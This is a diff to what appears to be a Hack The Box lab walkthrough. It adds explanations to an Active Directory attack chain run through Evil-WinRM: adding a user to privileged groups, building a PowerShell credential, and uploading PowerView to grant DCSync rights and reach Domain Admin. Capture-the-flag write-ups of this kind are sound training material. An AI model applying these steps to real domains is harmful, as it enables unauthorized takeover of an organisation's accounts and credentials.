@@ -278,12 +278,18 @@ Now, add it into "Exchange Windows Permissions" group:
 ```bash
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" john /add
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" john /add
+```
+I am the svc-alfresco user right now. But I want to give permission to the user john, right? I will do it with the help of Add-DomainObjectAcl, but there are some key points that we need to be careful about. In this command, we will use the -Credential parameter to show the system that: "We are the svc-alfresco user, but this command will be executed as the john user—because the john user is in the 'Exchange Windows Permissions' group and only he can give DCSync rights to himself. We cannot do it as the svc-alfresco user." Yeah, so I need to prove this user's identity to execute this command. But I cannot do it with a plain password. In PowerShell, many security commands do not allow us to send a password as a simple piece of text like 'abc123!'. So, we need to encrypt it. That is why we should create a "pass" variable beforehand.  
+
+```bash
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = ConvertTo-SecureString 'abc123!' -AsPlainText -Force
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = New-Object System.Management.Automation.PSCredential('htb\john', $pass)
 
 ```
+The $cred variable is used to prove the user's full identity. We will use it when we write the Add-DomainObjectAcl command.  
+  
 I need PowerView because standard Windows commands do not allow me to modify complex Active Directory ACLs directly from the command line.      
-PowerView provides specialized functions like Add-DomainObjectAcl, which are essential for granting myself the DCSync rights required to escalate my privileges.     
+PowerView provides specialized functions like Add-DomainObjectAcl, which are essential for granting the user's the DCSync rights required to escalate my privileges.     
 Essentially, it acts as the bridge that allows me to turn my Account Operator status into full Domain Admin control.  
 ```bash
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
